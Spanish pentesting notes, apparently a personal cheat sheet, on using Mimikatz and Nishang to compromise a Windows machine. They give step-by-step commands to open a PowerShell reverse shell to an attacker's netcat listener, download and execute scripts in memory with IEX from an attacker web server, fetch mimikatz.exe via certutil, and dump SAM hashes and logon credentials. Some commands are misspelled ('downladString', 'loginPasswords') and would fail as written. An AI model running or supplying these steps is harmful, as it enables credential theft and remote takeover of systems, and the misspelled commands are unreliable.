Mimikatz es una herramienta para extraer:
* passwords en texto plano
* hashes
* PINs y tickets de kerberos
* Realizar pass-the-hash, pass-the-ticket o construir Golden tickets

===========================================================================

** Nishang **
https://github.com/samratashok/nishang
Nishang es un framework y una colección de scripts y payloads que permite el uso de Powershell para seguridad ofensiva, pentesting y red team. Muy útil para todas las fases de un pentesting.

Invoke-Mimikatz.ps1 es el script que nos permite dumpear los hashes
En el sistema local:
>Copiamos el fichero Invoke-Mimikatz.ps1 para modificarlo
>`cp /usr/share/nishang/Gather/Invoke-Mimikatz.ps1 .`
>Modificamos el archivo para poner en la última línea las funciones que dumpearán los hashes
>`Invoke-Mimikatz -Command "token::elevate"`
>`Invoke-Mimikatz -Command "lsadump::sam"`
>Establecemos una reverse shell por Powershell con el script Invoke-PowershellTCP.ps1, también del repositorio de nishang
>Copiamos el fichero Invoke-PowershellTCP.ps1 para modificarlo
>`cp /usr/share/nishang/Shells/Invoke-PowershellTCP.ps1 .`
>Modificamos su última línea para añadir.
>`Invoke-PowershellTCP -Reverse -IPAddress <own_ip> -Port 443`
>Abrimos sesión con netcat donde recibiremos la reverse shell una vez el script se ejecute en el sistema Windows
>`rlwrap nc -nlvp 443`
>Creamos un servidor web para poder transferir los archivos
>`python -m SimpleHTTPServer 80`

En el sistema objetivo Windows, teniendo una cmd como consola
>Transferimos el archivo Invoke-PowershellTCP
>`start /b powershell IEX(New-Object Net.WebClient).downladString('http://<own_ip>:80/Invoke-PowershellTCP.ps1')`
>Recibiremos una reverse shell en la sesión abierta por netcat

En el sistema objetivo Windows, con una sesión con powershell
>Transferimos el fichero Invoke-Mimikatz.ps1 desde la máquina Windows
>`IEX(New-Object Net.WebClient).downladString('http://<own_ip>:80/Invoke-Mimikatz.ps1')`
>El script se ejecutará automáticamente gracias a los cambios realizados en él

===========================================================================

** mimikatz.exe **
En kali linux encontramos el recurso mimikatz.exe en /usr/share/responder/tools/Multirelay/bin/.

Transferimos mimikatz.exe a la máquina objetivo:
`certutil.exe -f -urlcache -split http://10.10.16.9/mimikatz.exe mimikatz.exe`
Uso de mimikatz.exe para extraer las credenciales:
`mimikatz.exe`
`privilege::debug`
`sekurlsa::loginPasswords`